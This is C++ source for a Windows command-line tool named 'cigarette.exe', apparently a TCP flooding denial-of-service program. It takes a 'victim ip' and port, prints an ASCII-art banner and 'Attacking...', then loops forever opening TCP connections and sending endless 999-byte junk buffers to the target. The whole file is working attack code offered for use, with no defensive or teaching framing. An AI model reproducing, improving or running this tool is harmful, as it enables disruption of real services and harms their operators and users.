#include<iostream>
#include<thread>
#include<vector>
#include<thread>
#include<Winsock2.h>
#include<WS2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

HANDLE color = GetStdHandle(STD_OUTPUT_HANDLE);

SOCKET sock;

int SendDATA();

int CreateAConnection(const char* server_ip, const char *server_port);

int main(int argc, char* argv[])
{

	int GetErrorCode = 0;

	if (argc != 3)
	{

		SetConsoleTextAttribute(color, FOREGROUND_RED);

		std::cout << "[-] ";

		SetConsoleTextAttribute(color, FOREGROUND_GREEN);

		std::cout << "Usage: cigarette.exe <victim ip> <victim port>" << std::endl;

		return 1;

	}

	SetConsoleTextAttribute(color, FOREGROUND_RED);

	system("cls");

	std::cout << R"(

"a, 8a"
 `8, `8)                            ,adPPRg,
  8)  ]8                        ,ad888888888b
 ,8' ,8'                    ,gPPR888888888888
,8' ,8'                 ,ad8""   `Y888888888P
8)  8)              ,ad8""        (8888888""
8,  8,          ,ad8""            d888""
`8, `8,    ,ad8""            ,ad8""
 `8, `" ,ad8""            ,ad8""
    ,gPPR8b           ,ad8""
   dP:::::Yb      ,ad8"" Version 1.0
   8):::::(8  ,ad8""	 Don't lose your way
   Yb:;;;:d888""  
    "8ggg8P"      

	)" << std::endl;

	SetConsoleTextAttribute(color, FOREGROUND_GREEN);

	std::cout << "[CIGARETTE] Attacking..." << std::endl;

	for (;;)
	{

		if ((GetErrorCode = CreateAConnection(argv[1], argv[2])) < 0)
		
			continue;

		if ((GetErrorCode = SendDATA()) < 0)

			continue;

	}


	return 0;

}


int SendDATA()
{

	int CheckSend = 0;

	const int SIZE = 999;

	char DATA[SIZE];

	memset(DATA, 'g', SIZE);

	for (;;)
	{

		if ((CheckSend = send(sock, DATA, SIZE, 0)) < 0)

			return CheckSend;

	}

}

int CreateAConnection(const char* server_ip, const char* server_port)
{

	WSADATA wsadata;

	struct addrinfo* result = NULL, * s_ptr = NULL, client;

	int CheckResult = 0;

	CheckResult = WSAStartup(MAKEWORD(2,2), &wsadata);

	if (CheckResult != 0)
	{

		SetConsoleTextAttribute(color, FOREGROUND_RED);

		std::cout << "[WSASTARTUP] Error code: " << CheckResult << std::endl;

		return -1;

	}

	ZeroMemory(&client, sizeof(client));

	client.ai_family = AF_UNSPEC;

	client.ai_socktype = SOCK_STREAM;

	client.ai_protocol = IPPROTO_TCP;

	CheckResult = getaddrinfo(server_ip, server_port, &client, &result);

	if (CheckResult != 0)
	{

		SetConsoleTextAttribute(color, FOREGROUND_RED);
		
		std::cout << "[GETADDRINFO] Error code: " << CheckResult << std::endl;

		return -1;

	}

	for (s_ptr = result; s_ptr != NULL; s_ptr = s_ptr->ai_next)
	{

		sock = socket(s_ptr->ai_family, s_ptr->ai_socktype, s_ptr->ai_protocol);

		if (sock == INVALID_SOCKET)
		{

			SetConsoleTextAttribute(color, FOREGROUND_RED);

			std::cout << "[SOCKET] Error code: " << WSAGetLastError() << std::endl;

			WSACleanup();

			return -1;

		}


		CheckResult = connect(sock, s_ptr->ai_addr, (int)s_ptr->ai_addrlen);

		if (CheckResult == SOCKET_ERROR)
		{

			SetConsoleTextAttribute(color, FOREGROUND_RED);

			std::cout << "[CONNECT] Error code: " << WSAGetLastError() << std::endl;

			closesocket(sock);

			continue;

		}

		SetConsoleTextAttribute(color, FOREGROUND_GREEN);

	}

	freeaddrinfo(result);

}